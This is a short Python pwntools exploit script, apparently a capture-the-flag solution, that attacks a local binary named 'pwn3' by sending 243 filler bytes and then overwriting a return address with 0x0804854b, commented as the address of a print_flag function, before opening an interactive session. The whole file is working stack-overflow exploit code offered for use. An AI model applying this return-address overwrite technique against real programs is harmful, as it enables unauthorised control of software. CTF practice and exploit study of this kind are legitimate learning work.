#!/usr/bin/env python

from pwn import *
import os
import sys
import r2pipe

context.arch = 'i386'
context.log_level = 'info'

io = process('./pwn3') 




def exploit():
    try:
        io.recvuntil('Now what should I echo?')
        io.send('A' * 243)
	io.sendline(p32(0x0804854b)) # address to print_flag function
        io.interactive()
    except Exception as e:
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        log.error("Exception catched on line %d %s" % (exc_tb.tb_lineno, e))

if __name__ == "__main__":
    exploit()
